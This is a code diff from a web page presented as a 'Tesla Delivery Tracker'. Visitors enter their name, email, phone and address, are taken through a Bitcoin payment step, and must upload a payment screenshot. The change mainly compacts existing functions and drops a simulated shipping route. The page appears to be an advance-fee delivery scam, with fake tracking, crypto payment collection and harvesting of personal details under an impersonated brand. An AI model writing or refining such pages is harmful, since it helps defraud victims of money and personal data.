+      const statusMap = { splash: 'Initialization', registration: 'Registration', 'tracking-select': 'Verification', map: 'Live Tracking', payment: 'Payment Processing', confirmation: 'Confirmed' };
       document.getElementById('navStatus').textContent = 'Status: ' + (statusMap[pageId] || 'Tracking');
     }
 
-    // Form Validation
-    function validateEmail(email) {
-      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
-    }
-
-    function validatePhone(phone) {
-      return /^[\d\s+\-()]{7,}$/.test(phone);
-    }
+    function validateEmail(email) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email); }
+    function validatePhone(phone) { return /^[\d\s+\-()]{7,}$/.test(phone); }
 
     function validateForm() {
       const fullName = document.getElementById('fullName').value.trim();
@@ -1264,52 +1292,20 @@
       const phone = document.getElementById('phone').value.trim();
       const address = document.getElementById('address').value.trim();
       const trackingNumber = document.getElementById('trackingNumber').value.trim();
-
       let isValid = true;
-
-      // Clear errors
       document.querySelectorAll('.error-text').forEach(el => el.style.display = 'none');
       document.querySelectorAll('input, textarea').forEach(el => el.classList.remove('error'));
-
-      if (fullName.length < 3) {
-        document.getElementById('fullName').classList.add('error');
-        document.getElementById('fullName').nextElementSibling.style.display = 'block';
-        isValid = false;
-      }
-
-      if (!validateEmail(email)) {
-        document.getElementById('email').classList.add('error');
-        document.getElementById('email').nextElementSibling.style.display = 'block';
-        isValid = false;
-      }
-
-      if (!validatePhone(phone)) {
-        document.getElementById('phone').classList.add('error');
-        document.getElementById('phone').nextElementSibling.style.display = 'block';
-        isValid = false;
-      }
-
-      if (address.length < 10) {
-        document.getElementById('address').classList.add('error');
-        document.getElementById('address').nextElementSibling.style.display = 'block';
-        isValid = false;
-      }
-
-      if (trackingNumber.length === 0) {
-        document.getElementById('trackingNumber').classList.add('error');
-        document.getElementById('trackingNumber').nextElementSibling.style.display = 'block';
-        isValid = false;
-      }
-
+      if (fullName.length < 3) { document.getElementById('fullName').classList.add('error'); document.getElementById('fullName').nextElementSibling.style.display = 'block'; isValid = false; }
+      if (!validateEmail(email)) { document.getElementById('email').classList.add('error'); document.getElementById('email').nextElementSibling.style.display = 'block'; isValid = false; }
+      if (!validatePhone(phone)) { document.getElementById('phone').classList.add('error'); document.getElementById('phone').nextElementSibling.style.display = 'block'; isValid = false; }
+      if (address.length < 10) { document.getElementById('address').classList.add('error'); document.getElementById('address').nextElementSibling.style.display = 'block'; isValid = false; }
+      if (trackingNumber.length === 0) { document.getElementById('trackingNumber').classList.add('error'); document.getElementById('trackingNumber').nextElementSibling.style.display = 'block'; isValid = false; }
       return isValid;
     }
 
-    // Submit Registration
     function submitRegistration(event) {
       event.preventDefault();
-
       if (!validateForm()) return;
-
       userCache = {
         fullName: document.getElementById('fullName').value.trim(),
         email: document.getElementById('email').value.trim(),
@@ -1317,80 +1313,46 @@
         address: document.getElementById('address').value.trim(),
         trackingNumber: document.getElementById('trackingNumber').value.trim()
       };
-
       document.getElementById('trackingDisplay').value = userCache.trackingNumber;
       goToPage('tracking-select');
     }
 
-    // Simulate Tracking Progress
-    function simulateTracking() {
-      const locations = ['Tesla Factory', 'En Route - Europe', 'Over Atlantic', 'Approaching Iceland', 'Final Approach'];
-      const statuses = ['In Transit', 'In Transit', 'In Transit', 'Landing Procedures', 'Ready for Delivery'];
-      
-      let index = 0;
-      const interval = setInterval(() => {
-        if (index < locations.length) {
-          document.getElementById('statusLocation').textContent = locations[index];
-          document.getElementById('statusVehicle').textContent = statuses[index];
-          index++;
-        } else {
-          clearInterval(interval);
-        }
-      }, 1500);
-    }
-
-    // Copy to Clipboard
     function copyToClipboard(text) {
-      navigator.clipboard.writeText(text).then(() => {
-        alert('Bitcoin address copied to clipboard!');
-      });
+      navigator.clipboard.writeText(text).then(() => { alert('Bitcoin address copied to clipboard!'); });
     }
 
-    // Handle File Upload
     function handleFileUpload() {
       const file = document.getElementById('paymentFile').files[0];
-      if (file) {
-        document.getElementById('fileName').textContent = '✓ File selected: ' + file.name;
-      }
+      if (file) document.getElementById('fileName').textContent = '✓ File selected: ' + file.name;
     }
 
-    // Process Payment
     function processPayment() {
       const file = document.getElementById('paymentFile').files[0];
-      if (!file) {
-        alert('Please upload a payment proof screenshot');
-        return;
-      }
-
+      if (!file) { alert('Please upload a payment proof screenshot'); return; }
       const reader = new FileReader();
-      reader.onload = function(e) {
-        populateConfirmation(e.target.result);
-        goToPage('confirmation');
-      };
+      reader.onload = function(e) { populateConfirmation(e.target.result); goToPage('confirmation'); };
       reader.readAsDataURL(file);
     }
 
-    // Populate Confirmation
     function populateConfirmation(imageData) {
       document.getElementById('recipientName').textContent = userCache.fullName;
       document.getElementById('recipientEmail').textContent = userCache.email;
       document.getElementById('recipientPhone').textContent = userCache.phone;
       document.getElementById('recipientAddress').textContent = userCache.address;
-
       document.getElementById('confirmName').textContent = userCache.fullName;
       document.getElementById('confirmAddress').textContent = userCache.address;
       document.getElementById('confirmEmail').textContent = userCache.email;
       document.getElementById('confirmImage').src = imageData;
     }
 
-    // Complete Tracking
     function completeTracking() {
       alert('Thank you for using Tesla Delivery Tracker! Your vehicle will arrive within 48-72 hours. You will receive updates via email at: ' + userCache.email);
       goToPage('splash');
       resetForm();
+      map = null;
+      currentMarker = null;
     }
 
-    // Reset Form
     function resetForm() {
       document.getElementById('registrationForm').reset();
       document.getElementById('paymentFile').value = '';
@@ -1398,7 +1360,6 @@
       userCache = {};
     }
 
-    // Initialize
     window.onload = () => {
       updateProgress('splash');
       updateNavStatus('splash');
